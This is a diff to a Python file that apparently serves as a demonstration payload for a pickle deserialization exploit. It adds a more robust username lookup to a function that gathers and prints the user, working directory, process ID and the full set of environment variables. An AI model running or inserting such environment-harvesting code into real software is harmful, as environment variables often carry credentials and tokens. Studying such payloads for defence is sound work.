@@ -1,21 +1,42 @@
-"""
-EXPLOIT PICKLE 
-
-"""
-
 import pickle
 import os
 import sys
 import json
-
 
 def collect_and_display():
     import os, json, sys
     
     print("Dados coletados pelo exploit")
     
+
+    def get_safe_username():
+        env_vars = ['USER', 'USERNAME', 'LOGNAME']
+        for var in env_vars:
+            if var in os.environ and os.environ[var]:
+                return os.environ[var]
+        try:
+            if hasattr(os, 'getlogin'):
+                return os.getlogin()
+        except (OSError, AttributeError):
+            pass
+        
+        try:
+            import getpass
+            return getpass.getuser()
+        except:
+            pass
+        
+       
+        try:
+            import pwd
+            return pwd.getpwuid(os.getuid())[0]
+        except:
+            pass
+        
+        return 'unknown'
+    
     data = {
-        'user': os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
+        'user': get_safe_username(),
         'cwd': os.getcwd(),
         'env': dict(os.environ),
         'python_version': sys.version,
@@ -32,7 +53,6 @@ def collect_and_display():
     print(f"PID: {data['pid']}")
     
     print(f"\nVARIÁVEIS DE AMBIENTE ({len(data['env'])} no total):")
- 
     
     env_keys = list(data['env'].keys())
     for i, key in enumerate(env_keys[:10]):
